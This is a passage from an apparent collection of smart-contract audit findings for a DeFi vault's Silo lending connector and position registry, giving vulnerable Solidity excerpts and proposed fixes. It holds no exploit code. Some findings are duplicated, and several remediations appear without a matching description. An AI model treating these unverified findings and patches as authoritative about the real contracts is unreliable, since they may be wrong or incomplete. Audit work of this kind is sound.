However, `SiloConnector._getPositionTVL` (lines 113–127 of `contracts/connectors/SiloConnector.sol`) queries the raw share balances and treats them directly as underlying token amounts:

```solidity
uint256 depositAmount = IERC20(assetsS[i].collateralToken).balanceOf(address(this));
depositAmount += IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this));
uint256 borrowAmount = IERC20(assetsS[i].debtToken).balanceOf(address(this));
if (depositAmount == 0 && borrowAmount == 0) {
    continue;
}
uint256 price = _getValue(assets[i], base, 1e18);
totalDepositAmount += depositAmount * price / 1e18;
totalBAmount += borrowAmount * price / 1e18;
```

Because `depositAmount` and `borrowAmount` are share counts rather than underlying token quantities:
1. Whenever `totalDeposits > collateralToken.totalSupply()` or `totalBorrowAmount > debtToken.totalSupply()` (i.e. any Silo market that has accrued interest prior to the connector's interaction), depositing or borrowing $X$ underlying tokens mints fewer than $X$ shares. `_getPositionTVL` immediately under-values the deposited collateral or borrowed debt.
2. While the position is open, `balanceOf(address(this))` on the share tokens stays constant as interest accrues. Consequently, `_getPositionTVL` never reflects accrued deposit yield or accrued borrow interest until positions are modified.

findings.remediation:
Convert the `collateralToken`, `collateralOnlyToken`, and `debtToken` share balances to underlying token amounts (including compounded interest since the last update timestamp) before pricing them in `SiloConnector._getPositionTVL`:

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        PositionBP memory bp = registry.getPositionBP(vaultId, p.positionId);
        (address siloToken) = abi.decode(bp.data, (address));
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        (address[] memory assets, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        uint256 protocolShareFee = siloRepository.protocolShareFee();
        uint256 totalDepositAmount = 0;
        uint256 totalBAmount = 0;
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 collateralShares = IERC20(assetsS[i].collateralToken).balanceOf(address(this));
            uint256 collateralOnlyShares = IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this));
            uint256 debtShares = IERC20(assetsS[i].debtToken).balanceOf(address(this));
            if (collateralShares == 0 && collateralOnlyShares == 0 && debtShares == 0) {
                continue;
            }
            IInterestRateModel model = siloRepository.getInterestRateModel(address(silo), assets[i]);
            uint256 rcomp = model.getCompoundInterestRate(address(silo), assets[i], block.timestamp);

            uint256 depositAmount = collateralShares == 0
                ? 0
                : EasyMathV2.toAmount(
                    collateralShares,
                    SolvencyV2.totalDepositsWithInterest(
                        assetsS[i].totalDeposits, assetsS[i].totalBorrowAmount, protocolShareFee, rcomp
                    ),
                    assetsS[i].collateralToken.totalSupply()
                );
            if (collateralOnlyShares > 0) {
                depositAmount += EasyMathV2.toAmount(
                    collateralOnlyShares,
                    assetsS[i].collateralOnlyDeposits,
                    assetsS[i].collateralOnlyToken.totalSupply()
                );
            }
            uint256 borrowAmount = debtShares == 0
                ? 0
                : EasyMathV2.toAmountRoundUp(
                    debtShares,
                    SolvencyV2.totalBorrowAmountWithInterest(assetsS[i].totalBorrowAmount, rcomp),
                    assetsS[i].debtToken.totalSupply()
                );

            uint256 price = _getValue(assets[i], base, 1e18);
            totalDepositAmount += depositAmount * price / 1e18;
            totalBAmount += borrowAmount * price / 1e18;
        }
        tvl = totalDepositAmount - totalBAmount;
    }
```

findings.technical_details:
In `SiloConnector._getPositionTVL` (`contracts/connectors/SiloConnector.sol`, lines 123–125), the connector values each Silo market asset's deposit and borrow amounts in terms of the vault's `base` token as follows:

```solidity
uint256 price = _getValue(assets[i], base, 1e18);
totalDepositAmount += depositAmount * price / 1e18;
totalBAmount += borrowAmount * price / 1e18;
```

`BaseConnector._getValue(address token, address baseToken, uint256 amount)` converts `amount` (expressed in `token`'s native decimals) into an integer amount of `baseToken` (expressed in `baseToken`'s native decimals) via `valueOracle.getValue(token, baseToken, amount)`.

Using a hardcoded `1e18` unit amount and divisor introduces valuation arithmetic flaws:

1. **Premature Truncation in `base` Decimals:** `_getValue(assets[i], base, 1e18)` returns the value of `1e18` base units of `assets[i]` denominated in `base` token decimals. When `assets[i]` has 18 decimals and `base` has fewer decimals (e.g., 6 decimals for USDC or 8 decimals for WBTC), or when 1 unit (`1e18`) of `assets[i]` has a small price relative to `base`, the returned `price` is integer-truncated in `base` units before being multiplied by `depositAmount` and `borrowAmount`. If `1e18` units of `assets[i]` is worth less than 1 unit of `base`, `price` rounds down to `0`, valuing the entire deposit or debt position at `0`.
2. **Assumed 18-Decimal Scaling:** `Silo` share tokens (`collateralToken`, `collateralOnlyToken`, `debtToken`) match the decimals of the underlying `assets[i]`. By querying `_getValue(assets[i], base, 1e18)` instead of using `10 ** IERC20Metadata(assets[i]).decimals()` (or converting `depositAmount` and `borrowAmount` directly via `_getValue`), the code assumes `1e18` represents one whole token of `assets[i]`. For non-18-decimal tokens (e.g., 6-decimal USDT/USDC), `1e18` represents $10^{12}$ whole tokens rather than a single token, which can distort non-linear/liquidity-based oracle quotes or fail if `assets[i]` has more than 18 decimals.

findings.remediation:
Pass `depositAmount` and `borrowAmount` directly to `_getValue` so the oracle converts the exact token amounts using `assets[i]`'s actual decimals without intermediate unit-price truncation, or scale using `10 ** IERC20Metadata(assets[i]).decimals()`.

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        PositionBP memory bp = registry.getPositionBP(vaultId, p.positionId);
        (address siloToken) = abi.decode(bp.data, (address));
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        (address[] memory assets, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        uint256 totalDepositAmount = 0;
        uint256 totalBAmount = 0;
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 depositAmount = IERC20(assetsS[i].collateralToken).balanceOf(address(this));
            depositAmount += IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this));
            uint256 borrowAmount = IERC20(assetsS[i].debtToken).balanceOf(address(this));
            if (depositAmount == 0 && borrowAmount == 0) {
                continue;
            }
            totalDepositAmount += _getValue(assets[i], base, depositAmount);
            totalBAmount += _getValue(assets[i], base, borrowAmount);
        }
        tvl = totalDepositAmount - totalBAmount;
    }
```

Validate that the `calculatorConnector` is active (or handle disabled connectors / reverting non-debt valuations gracefully) and provide a safe fallback or administrative recovery path so a disabled or malfunctioning calculator does not permanently brick `getTVL`. In `TVLHelper.getTVL`, skip disabled calculator connectors (or wrap `getPositionTVL` in a `try/catch` where appropriate according to the protocol's staleness/safety policy):

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            address calculator = positions[i].calculatorConnector;
            if (calculator == address(0) || !registry.isAnActiveConnector(vaultId, calculator)) {
                continue;
            }
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            try IConnector(calculator).getPositionTVL(positions[i], baseToken) returns (uint256 tvl) {
                if (isPositionDebt) {
                    totalDebt += tvl;
                } else {
                    totalTVL += tvl;
                }
            } catch {
                if (isPositionDebt) {
                    revert();
                }
            }
        }
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
    }
```

Initialize `latestUpdateTime` to `type(uint256).max` as an unambiguous sentinel, skip inactive placeholder positions (`calculatorConnector == address(0)`), allow `0` to be properly tracked as the minimum timestamp if an active position has not been updated, and only fall back to `block.timestamp` when there are no active holding positions:

```solidity
    function getLatestUpdateTime(uint256 vaultId, PositionRegistry registry) public view returns (uint256) {
        uint256 latestUpdateTime = type(uint256).max;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            if (positions[i].positionTimestamp < latestUpdateTime) {
                latestUpdateTime = positions[i].positionTimestamp;
            }
        }
        if (latestUpdateTime == type(uint256).max) {
            latestUpdateTime = block.timestamp;
        }
        return latestUpdateTime;
    }
```

findings.technical_details:
In `SiloConnector.deposit` (`contracts/connectors/SiloConnector.sol`, lines 34–42), depositing `dToken` into a Silo market executes two consecutive registry updates:

1. Line 37 calls `_updateTokenInRegistry(dToken)` (`contracts/helpers/BaseConnector.sol`, lines 135–160).
2. Lines 38–40 call `registry.updateHoldingPosition(vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", false)`.

For standard ERC20 token holding positions (position type `0`), `_updateTokenInRegistry` computes the blueprint `positionId` using `accountingManager` as the `calculatorConnector`:

```solidity
bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
```

However, when `PositionRegistry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol`, line 345) and `PositionRegistry.getHoldingPositionIndex` (line 399) compute the unique `holdingPositionId` key for `vault.isPositionUsed`, they hash the **connector that owns the position** (`msg.sender` / `ownerConnector`), not `calculatorConnector`:

```solidity
bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
```

When `PositionRegistry.updateHoldingPosition` adds the position (lines 312–321), it stores `HoldingPI` with:
- `calculatorConnector = vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector` (which is `accountingManager` for token positions), and
- `ownerConnector = msg.sender` (which is `address(SiloConnector)`).

When `SiloConnector.deposit` deposits the connector's entire balance of `dToken`, `IERC20(dToken).balanceOf(address(this)) == 0`, so `_updateTokenInRegistry(dToken)` calls `registry.updateHoldingPosition(..., true)` to remove the `dToken` holding position. In `PositionRegistry.updateHoldingPosition` (lines 348–360):

```solidity
if (removePosition) {
    if (positionIndex < vault.holdingPositions.length - 1) {
        vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
        vault.isPositionUsed[keccak256(
            abi.encode(
                vault.holdingPositions[positionIndex].calculatorConnector,
                vault.holdingPositions[positionIndex].positionId,
                vault.holdingPositions[positionIndex].data
            )
        )] = positionIndex;
    }
    vault.holdingPositions.pop();
    vault.isPositionUsed[holdingPositionId] = 0;
```

At line 353, `PositionRegistry` hashes `calculatorConnector` instead of `ownerConnector` when updating `vault.isPositionUsed` for the swapped last element. Because `calculatorConnector` (`accountingManager`) differs from `ownerConnector` (`SiloConnector`) for token positions, `vault.isPositionUsed` is written to the wrong key, while the moved position's actual `holdingPositionId` (hashed with `ownerConnector`) retains its old index `vault.holdingPositions.length - 1`.

Immediately afterwards in `SiloConnector.deposit` (lines 38–40), `registry.updateHoldingPosition` pushes the `SILO_LP_ID` position into that exact index (`vault.holdingPositions.length - 1` before the push), causing two active positions to share the same `isPositionUsed` index while the moved token position at `positionIndex` becomes untracked by its `holdingPositionId`.

findings.remediation:
In `PositionRegistry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol`), use `ownerConnector` instead of `calculatorConnector` when updating `vault.isPositionUsed` for the swapped position so that the key matches the `holdingPositionId` computation in `updateHoldingPosition` and `getHoldingPositionIndex`:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

Use `ownerConnector` when reconstructing the moved holding’s canonical key during swap-and-pop:

```solidity
vault.isPositionUsed[
    keccak256(
        abi.encode(
            vault.holdingPositions[positionIndex].ownerConnector,
            vault.holdingPositions[positionIndex].positionId,
            vault.holdingPositions[positionIndex].data
        )
    )
] = positionIndex;
```

As defense in depth, removal should also reject out-of-range indices and verify that the entry at the resolved index hashes to the requested holding identifier before mutating the array. Reordering calls in `SiloConnector.withdraw` is not a complete fix because any moved holding whose owner differs from its calculator can trigger the same corruption.

findings.technical_details:
In `BaseConnector` and other lending connectors (`AaveConnector`, `CompoundConnector`, `MorphoBlueConnector`), `minimumHealthFactor` represents a standard health factor floor (initialized to `15e17`, i.e., `1.5`), where a larger value means a safer collateralization ratio. Accordingly, `BaseConnector.updateMinimumHealthFactor` enforces a lower bound:

```solidity
function updateMinimumHealthFactor(uint256 _minimumHealthFactor) external onlyMaintainer {
    if (_minimumHealthFactor < MINIMUM_HEALTH_FACTOR) {
        revert IConnector_LowHealthFactor(_minimumHealthFactor);
    }
    minimumHealthFactor = _minimumHealthFactor;
    emit MinimumHealthFactorUpdated(_minimumHealthFactor);
}
```

In `SiloConnector` (lines 21–23), the constructor overrides `MINIMUM_HEALTH_FACTOR` to `5e17` (`0.5`) and sets `minimumHealthFactor = MINIMUM_HEALTH_FACTOR`. However, `SiloConnector` does not use `minimumHealthFactor` as a health factor. Instead, in `withdraw` (line 65), `getData` (line 76), and `repay` (line 103), it passes `minimumHealthFactor` as the `liquidationThresholdMultilpier` argument to `SolvencyV2.isSolvent`:

```solidity
return userLTV <= LiquidationThreshold * liquidationThresholdMultilpier / _PRECISION_DECIMALS;
```

Because `userLTV` is compared against `LiquidationThreshold * liquidationThresholdMultilpier / 1e18`, the semantics of this parameter are inverted relative to a health factor:
1. **Higher values increase risk:** Increasing `minimumHealthFactor` increases the maximum permitted `userLTV`.
2. **No upper bound at `1e18`:** Setting `minimumHealthFactor >= 1e18` allows `userLTV` to reach or exceed 100% of `LiquidationThreshold`, rendering the custom safety margin ineffective and allowing unhealthy positions in `SolvencyV2.isSolvent`.
3. **Cannot tighten risk below `5e17`:** Because `BaseConnector.updateMinimumHealthFactor` reverts when `_minimumHealthFactor < MINIMUM_HEALTH_FACTOR` (`5e17`), the maintainer cannot reduce the multiplier below 50% of the liquidation threshold to enforce a safer LTV limit, and can only increase it toward or beyond liquidation.

findings.remediation:
Override `updateMinimumHealthFactor` (making it `virtual` in `BaseConnector`) in `SiloConnector` so that it enforces an upper bound (e.g., `<= 8e17` or `< 1e18`), or convert the health factor into a liquidation threshold multiplier inversely (`liquidationThresholdMultiplier = 1e36 / minimumHealthFactor`) so that `minimumHealthFactor` preserves the same semantics across all connectors.

```solidity
    constructor(address SR, BaseConnectorCP memory baseConnectorParams) BaseConnector(baseConnectorParams) {
        require(SR != address(0));

        siloRepository = ISiloRepository(SR);
        MINIMUM_HEALTH_FACTOR = 8e17;

        minimumHealthFactor = 5e17;
    }

    function updateMinimumHealthFactor(uint256 _minimumHealthFactor) external override onlyMaintainer {
        if (_minimumHealthFactor == 0 || _minimumHealthFactor > MINIMUM_HEALTH_FACTOR) {
            revert IConnector_LowHealthFactor(_minimumHealthFactor);
        }
        minimumHealthFactor = _minimumHealthFactor;
        emit MinimumHealthFactorUpdated(_minimumHealthFactor);
    }
```

Validate the current trust status of `dToken` before approval or interaction with Silo. This runtime check should remain mandatory even when the pool-level position blueprint is trusted.

```solidity
function deposit(address siloToken, address dToken, uint256 amount, bool oC)
    external
    onlyManager
    nonReentrant
{
    if (!registry.isTokenTrusted(vaultId, dToken, address(this))) {
        revert IConnector_UntrustedToken(dToken);
    }

    ISilo silo = ISilo(siloRepository.getSilo(siloToken));
    _approveOperations(dToken, address(silo), amount);
    silo.deposit(dToken, amount, oC);
    _updateTokenInRegistry(dToken);
    registry.updateHoldingPosition(
        vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", false
    );
    emit Deposit(siloToken, dToken, amount, oC);
}
```

As defense in depth, the protocol should also reevaluate affected multi-asset position blueprints whenever Silo’s underlying asset set changes.

Update `SiloConnector._getPositionTVL` to convert `collateralToken`, `collateralOnlyToken`, and `debtToken` share balances into underlying asset amounts (including accrued interest) before valuing them via `_getValue`:

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        PositionBP memory bp = registry.getPositionBP(vaultId, p.positionId);
        (address siloToken) = abi.decode(bp.data, (address));
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        (address[] memory assets, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        SolvencyV2.SolvencyParams memory params =
            SolvencyV2.SolvencyParams(siloRepository, silo, assets, assetsS, address(this));
        uint256[] memory collateralAmounts = SolvencyV2.getCollateralAmounts(params);
        uint256[] memory borrowAmounts = SolvencyV2.getBorrowAmounts(params);
        uint256 totalDepositAmount = 0;
        uint256 totalBAmount = 0;
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 depositAmount = collateralAmounts[i];
            uint256 borrowAmount = borrowAmounts[i];
            if (depositAmount == 0 && borrowAmount == 0) {
                continue;
            }
            if (depositAmount > 0) {
                totalDepositAmount += _getValue(assets[i], base, depositAmount);
            }
            if (borrowAmount > 0) {
                totalBAmount += _getValue(assets[i], base, borrowAmount);
            }
        }
        tvl = totalDepositAmount - totalBAmount;
    }
```

findings.technical_details:
In `BaseConnector`, `minimumHealthFactor` represents the minimum required health factor for borrowing connectors, initialized to `MINIMUM_HEALTH_FACTOR` (`15e17` in `BaseConnector`, overridden to `5e17` in `SiloConnector.constructor`). The setter `BaseConnector.updateMinimumHealthFactor` enforces that the health factor can only be set at or above `MINIMUM_HEALTH_FACTOR`:

```solidity
function updateMinimumHealthFactor(uint256 _minimumHealthFactor) external onlyMaintainer {
    if (_minimumHealthFactor < MINIMUM_HEALTH_FACTOR) {
        revert IConnector_LowHealthFactor(_minimumHealthFactor);
    }
    minimumHealthFactor = _minimumHealthFactor;
    emit MinimumHealthFactorUpdated(_minimumHealthFactor);
}
```

However, in `SiloConnector.withdraw` (line 65), `minimumHealthFactor` is passed to `SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)`.

Inspecting `SolvencyV2.isSolvent` (lines 47–56 of `contracts/external/libraries/Silo/SolvencyV2.sol`):

```solidity
function isSolvent(ISilo pool, address _user, uint256 liquidationThresholdMultilpier) public view returns (bool) {
    if (_user == address(0)) revert UserIsZero();

    (address[] memory assets, IBaseSilo.AssetStorage[] memory assetsStates) = pool.getAssetsWithState();

    (uint256 userLTV, uint256 LiquidationThreshold) = SolvencyV2.calculateLTVs(
        SolvencyParams(pool.siloRepository(), pool, assets, assetsStates, _user), TypeofLTV.LiquidationThreshold
    );
    return userLTV <= LiquidationThreshold * liquidationThresholdMultilpier / _PRECISION_DECIMALS;
}
```

Here, `userLTV` is `borrowTotalValue * 1e18 / collateralTotalValue`. A safer (more collateralized) position has a **lower** `userLTV` and a **higher** health factor (`LiquidationThreshold / userLTV`).

Because `SolvencyV2.isSolvent` checks `userLTV <= LiquidationThreshold * liquidationThresholdMultilpier / 1e18`, the parameter `liquidationThresholdMultilpier` is an upper-bound multiplier on LTV (inversely proportional to health factor), not a minimum health factor:

1. **Inverted risk direction when updating `minimumHealthFactor`:** When the maintainer calls `updateMinimumHealthFactor` with a higher value (e.g., increasing from `5e17` to `8e17` or `15e17` intending to enforce a larger safety buffer), the maximum allowed `userLTV` in `SiloConnector.withdraw` **increases** instead of decreasing. If `minimumHealthFactor` is set to `>= 1e18` (such as `15e17`, the standard 1.5x health factor used in `BaseConnector`), `LiquidationThreshold * minimumHealthFactor / 1e18 >= LiquidationThreshold`, completely nullifying the connector's extra solvency buffer and allowing withdrawals right up to the Silo liquidation threshold.
2. **Inability to tighten LTV bounds beyond the initial `5e17`:** To make the solvency check stricter (require `userLTV` to stay below 50% of `LiquidationThreshold`), `liquidationThresholdMultilpier` would need to be decreased below `5e17`. However, `updateMinimumHealthFactor` reverts with `IConnector_LowHealthFactor` for any `_minimumHealthFactor < MINIMUM_HEALTH_FACTOR` (`5e17`).

findings.remediation:
Either convert `minimumHealthFactor` into a true health factor (`>= 1e18`, e.g., `MINIMUM_HEALTH_FACTOR = 15e17`) and divide `LiquidationThreshold` by `minimumHealthFactor`, or compute the inverse multiplier when calling `SolvencyV2.isSolvent`.

In `contracts/connectors/SiloConnector.sol`, use standard health factor scaling (`MINIMUM_HEALTH_FACTOR = 15e17` inherited from `BaseConnector`) and pass `_PRECISION_DECIMALS * _PRECISION_DECIMALS / minimumHealthFactor` (i.e., `1e36 / minimumHealthFactor`) as the `liquidationThresholdMultilpier`:

```solidity
    function withdraw(address siloToken, address wToken, uint256 amount, bool oC, bool closePosition)
        external
        onlyManager
        nonReentrant
    {
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        silo.withdraw(wToken, amount, oC);
        _updateTokenInRegistry(wToken);
        if (closePosition && isSiloEmpty(silo)) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", true
            );
        }
        if (!SolvencyV2.isSolvent(silo, address(this), 1e36 / minimumHealthFactor)) {
            revert IConnector_LowHealthFactor(0);
        }
        emit Withdraw(siloToken, wToken, amount, oC, closePosition);
    }
```

findings.technical_details:
In `contracts/connectors/SiloConnector.sol`, the `withdraw` function withdraws `wToken` from the Silo pool and then checks whether to remove the `SILO_LP_ID` holding position from the vault's `PositionRegistry`:

```solidity
ISilo silo = ISilo(siloRepository.getSilo(siloToken));
silo.withdraw(wToken, amount, oC);
_updateTokenInRegistry(wToken);
if (closePosition && isSiloEmpty(silo)) {
    registry.updateHoldingPosition(
        vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", true
    );
}
```

When all collateral tokens across all assets in `silo` have been withdrawn, `isSiloEmpty(silo)` returns `true` (and line 65 verifies `SolvencyV2.isSolvent`, ensuring no active debt remains). At this point, the connector holds no position in the Silo pool.

However, because line 60 gates the `registry.updateHoldingPosition(..., true)` call behind `closePosition && isSiloEmpty(silo)`, if the manager calls `withdraw` with `closePosition = false` while withdrawing the remaining collateral balance, the `SILO_LP_ID` position is not removed from `vaults[vaultId].holdingPositions` in `Registry.sol`.

Furthermore, `withdraw` is the only function in `SiloConnector` that removes the `SILO_LP_ID` holding position from `PositionRegistry`. Once the Silo position is empty, the manager cannot simply call `withdraw(siloToken, wToken, 0, oC, true)` to remove the stale registry entry because Silo reverts on zero-amount/zero-share withdrawals (`ZeroShares()`). To clear the ghost holding position, the vault must deposit new funds into the Silo and withdraw them again with `closePosition = true`.

findings.remediation:
Remove the `closePosition` condition from the check at line 60 so that the `SILO_LP_ID` holding position is automatically removed from `PositionRegistry` whenever `isSiloEmpty(silo)` is `true`:

```solidity
    function withdraw(address siloToken, address wToken, uint256 amount, bool oC, bool closePosition)
        external
        onlyManager
        nonReentrant
    {
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        silo.withdraw(wToken, amount, oC);
        _updateTokenInRegistry(wToken);
        if (isSiloEmpty(silo)) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", true
            );
        }
        if (!SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)) {
            revert IConnector_LowHealthFactor(0);
        }
        emit Withdraw(siloToken, wToken, amount, oC, closePosition);
    }
```

The preferred solution is to make the shared solvency implementation fail closed whenever a nonzero debt amount has a zero oracle price. As defense in depth, `SiloConnector.withdraw` should independently inspect every outstanding Silo debt before accepting the solvency result.

A connector-level correction can use:

```solidity
error SiloConnector_ZeroDebtPrice(address asset);

function _requireValidDebtPrices(ISilo silo) internal view {
    (address[] memory assets, IBaseSilo.AssetStorage[] memory states) = silo.getAssetsWithState();
    IPriceProvidersRepository prices = silo.siloRepository().priceProvidersRepository();

    for (uint256 i = 0; i < assets.length; ++i) {
        if (states[i].debtToken.balanceOf(address(this)) != 0 && prices.getPrice(assets[i]) == 0) {
            revert SiloConnector_ZeroDebtPrice(assets[i]);
        }
    }
}
```

The post-withdrawal validation should then be:

```solidity
_requireValidDebtPrices(silo);

if (!SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)) {
    revert IConnector_LowHealthFactor(0);
}
```

Oracle adapters should also reject zero, stale, or otherwise invalid debt prices rather than forwarding them as valid observations.

findings.technical_details:
When `SiloConnector.withdraw` (`contracts/connectors/SiloConnector.sol:52-69`) is called with `closePosition = true`, it checks whether the Silo position can be removed from `PositionRegistry` at lines 60-64:

```solidity
if (closePosition && isSiloEmpty(silo)) {
    registry.updateHoldingPosition(
        vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", true
    );
}
```

The helper `isSiloEmpty(ISilo silo)` (`contracts/connectors/SiloConnector.sol:130-141`) retrieves all Silo assets and their `IBaseSilo.AssetStorage` structs via `silo.getAssetsWithState()`. Each `AssetStorage` struct (`contracts/external/interfaces/Silo/IBaseSilo.sol:15-30`) tracks three share tokens for each asset in the Silo:
- `collateralToken` (share in `totalDeposits`)
- `collateralOnlyToken` (share in `collateralOnlyDeposits`)
- `debtToken` (share in `totalBorrowAmount`)

However, `isSiloEmpty` only checks the two collateral share tokens:

```solidity
if (
    IERC20(assetsS[i].collateralToken).balanceOf(address(this))
        + IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this)) > 0
) {
    return false;
}
```

It never checks `IERC20(assetsS[i].debtToken).balanceOf(address(this))`.

Furthermore, `SolvencyV2.isSolvent` (`contracts/external/libraries/Silo/SolvencyV2.sol:47-56`) and `SolvencyV2.calculateLTVs` (`SolvencyV2.sol:83-120`) convert borrow amounts into quote values via `convertAmountsToValues`, which computes `(_amounts[i] * assetPrice) / (10 ** assetDecimals)`. If the connector has a residual borrow balance whose quote value rounds down to `0` (`borrowTotalValue == 0`), `calculateLTVs` immediately returns `(0, 0)` at line 99 before checking collateral values, and `isSolvent` returns `true` (`0 <= 0`) even when all collateral is withdrawn and `debtToken.balanceOf(address(this)) > 0`. Similarly, if a Silo position has had its collateral fully seized in liquidation while leaving unpaid bad debt in `debtToken`, all collateral share balances are `0` while `debtToken` balance remains positive.

Because `withdraw` and `isSiloEmpty` do not verify that `debtToken` balances are zero across all Silo assets, `withdraw` removes the `SILO_LP_ID` holding position from `PositionRegistry` while the connector still holds active debt shares in the Silo.

findings.remediation:
Ensure that `withdraw` (via `isSiloEmpty`) verifies that `debtToken` balances are also zero across all assets in the Silo before considering the Silo position empty and removing it from `PositionRegistry`.

```solidity
    function isSiloEmpty(ISilo silo) public view returns (bool) {
        (, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        for (uint256 i = 0; i < assetsS.length; i++) {
            if (
                IERC20(assetsS[i].collateralToken).balanceOf(address(this))
                    + IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this))
                    + IERC20(assetsS[i].debtToken).balanceOf(address(this)) > 0
            ) {
                return false;
            }
        }
        return true;
    }
```

findings.technical_details:
In `contracts/connectors/SiloConnector.sol`, the `repay` function allows the vault manager to repay borrowed `rToken` back to a Silo pool:

```solidity
function repay(address siloToken, address rToken, uint256 amount) external onlyManager nonReentrant {
    ISilo silo = ISilo(siloRepository.getSilo(siloToken));
    _approveOperations(rToken, address(silo), amount);
    silo.repay(rToken, amount);
    _updateTokenInRegistry(rToken);
    if (!SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)) {
        revert IConnector_LowHealthFactor(0);
    }
    emit Repay(siloToken, rToken, amount);
}
```

At lines 103–105, `repay` calls `SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)`, which verifies that:

$$\text{userLTV} \le \frac{\text{LiquidationThreshold} \times \text{minimumHealthFactor}}{10^{18}}$$

Repaying debt only decreases `borrowTotalValue` and therefore strictly reduces `userLTV` (improving the health of the position). However, if the vault's position becomes unhealthy—for example, due to adverse price movements, accrued borrow interest, or an increase in `minimumHealthFactor` via `updateMinimumHealthFactor`—and the connector or vault only holds enough `rToken` (or flash-loanable liquidity across multiple tokens) to partially repay the debt such that `userLTV` is still above the scaled threshold (`LiquidationThreshold * minimumHealthFactor / 1e18`), `repay` will revert with `IConnector_LowHealthFactor(0)`.

Furthermore, if a vault has borrowed multiple assets from the same Silo and needs to repay them sequentially in separate `repay` calls to bring total LTV below the threshold, the first `repay` call will revert if it alone is insufficient to satisfy `isSolvent`.

findings.remediation:
Remove the post-repayment solvency check from `SiloConnector.repay`, as repaying debt always improves the health of the position.

```solidity
    function repay(address siloToken, address rToken, uint256 amount) external onlyManager nonReentrant {
        ISilo silo = ISilo(siloRepository.getSilo(siloToken));
        _approveOperations(rToken, address(silo), amount);
        silo.repay(rToken, amount);
        _updateTokenInRegistry(rToken);
        emit Repay(siloToken, rToken, amount);
    }
```

findings.technical_details:
In `contracts/connectors/SiloConnector.sol`, `repay` executes the following sequence:

```solidity
function repay(address siloToken, address rToken, uint256 amount) external onlyManager nonReentrant {
    ISilo silo = ISilo(siloRepository.getSilo(siloToken));
    _approveOperations(rToken, address(silo), amount);
    silo.repay(rToken, amount);
    _updateTokenInRegistry(rToken);
    if (!SolvencyV2.isSolvent(silo, address(this), minimumHealthFactor)) {
        revert IConnector_LowHealthFactor(0);
    }
    emit Repay(siloToken, rToken, amount);
}
```

At line 102, `_updateTokenInRegistry(rToken)` delegates to `BaseConnector._updateTokenInRegistry(address token)`:

```solidity
function _updateTokenInRegistry(address token) internal {
    _updateTokenInRegistry(token, IERC20(token).balanceOf(address(this)) == 0);
}
```

which computes `positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token))` and queries `positionIndex = registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)))`. When `(positionIndex == 0 && !remove) || (positionIndex > 0 && remove)`, it calls `registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove)`.

This synchronization in `SiloConnector.repay` introduces critical position registry failure modes during debt servicing:

1. **Registration Constraints Blocking Debt Servicing (`repay` DoS):**
